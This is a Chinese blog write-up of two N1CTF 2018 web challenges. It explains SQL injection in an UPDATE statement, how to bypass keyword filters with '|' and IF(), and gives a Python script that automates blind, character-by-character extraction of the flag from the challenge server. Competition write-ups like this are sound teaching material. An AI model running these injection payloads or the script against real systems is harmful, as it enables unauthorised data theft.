---
layout: post
title: "N1CTF 77777 writeup"
date: 2018-03-12 22：40
categories: jekyll update
---

# 前言
&emsp;&emsp;这是我及我所在的团队第一次参加`正式`的CTF比赛，所取得的成绩也还算满意，比赛过程中作者负责`web`方向，比赛中的成果就是两道`77777`。

### 77777
&emsp;&emsp;题目描述：
<div align="center">
    <img src="/images/posts/n1ctf/1.png" >  
</div>
<div align="center">
    <img src="/images/posts/n1ctf/2.png" >  
</div>
&emsp;&emsp;这道题最坑的就是一开始`没有判断出是否注入成功的依据`，后面经师兄指导才发现依据就是注入的数字是否已经改变，当然这道题的环境官方也说明每个队注入`没有隔离开`，造成即使注入成功也可能被别的队刷走，从而影响判断。

&emsp;&emsp;又因为它是`sptintf("xxx%d%s")`，所以注入应该在`str`的地方，也就是在`hi`中进行注入，payload：`hi=000 where ord(substr(password, 1, 1))>100`，因为是在`update users set`中注入，所以这里不需要再使用`union,select`等方法了。完整的payload如下图：
<div align="center">
    <img src="/images/posts/n1ctf/3.png" >  
</div>
&emsp;&emsp;如果注入成功，则会返回你的`flag`字段，如：
<div align="center">
    <img src="/images/posts/n1ctf/4.png" >  
</div>
&emsp;&emsp;由于这个题的环境不稳定，不太适合脚本的判断，所以，就手工注入一遍了。

### 77777 2
&emsp;&emsp;这道题跟上一道提供的描述是一样的，不同的是对`hi`进行了更严格的过滤，上一道的payload就无效了。

&emsp;&emsp;这道题过滤了`and or || & &&`（为了不产生二义，这里用空格分隔），但是唯独没有过滤掉`|`。所以我们可以选择`|`进行`位注入`。然后在检测一下，没有被过滤的是：`substr select from if`，所以考虑用`if`替代`where`进行判断。

&emsp;&emsp;经过一轮苦逼的测试，终于搞出一个payload：`hi=000 |  IF (substr((select substr( pw from 1)),1,1)>'z',1,0)`，这里`( pw`中间一定要有`空格`，不然无法绕过。另一个要说的就是`pw from 1`，它会返回`pw字段从1开始的所有值`。如：
```
pw = 'flag{123456}'
pw from 1 ---> flag{123456}
```

&emsp;&emsp;payload：
<div align="center">
    <img src="/images/posts/n1ctf/5.png" >  
</div>
&emsp;&emsp;判断的依据是返回的数字的最后一位，如：
<div align="center">
    <img src="/images/posts/n1ctf/6.png" >  
</div>
&emsp;&emsp;如果是返回错误则是如下：
<div align="center">
    <img src="/images/posts/n1ctf/7.png" >  
</div>
<div align="center">
    <img src="/images/posts/n1ctf/8.png" >  
</div>
>另一个tips就是数字的后一位一定要`0`，不然如果是`1`的话就无法判断了。`1 |`任何也是真。

&emsp;&emsp;再然后就是逐位的判断，有些数字会被过滤掉，这点上不知道是我的payload有问题还是本来就是这样。。。。
<div align="center">
    <img src="/images/posts/n1ctf/9.png" >  
</div>
&emsp;&emsp;如上，逐位比较的时候使用`+1`的方法，如果直接用2,3,4,...的话有些数字`会被过滤`，还有就是有些字符也会被过滤，但无关flag字段。
&emsp;&emsp;附上脚本：
```python
# -*- coding:utf-8 -*-
import requests

url = 'http://47.52.137.90:20000/'
flag = ''

for i in range(1, 50):
    lc = ''
    for a in range(i):
        lc += '+1'
    lc = lc[1:]
    sql = '000 |  IF (substr((select substr( pw from 1)),{0},1)>\'{1}\',1,0)'
    for ch in range(33, 128):
        sqli = sql.format(lc, chr(ch))
        data = {
            'flag': 123,
            'hi': sqli
        }
        # print(data)
        html = requests.post(url, data=data)
        text = html.text
        # print(text)
        if '123000' in text:
            flag += chr(ch)
            print(flag)
            break
        else:
            pass
```

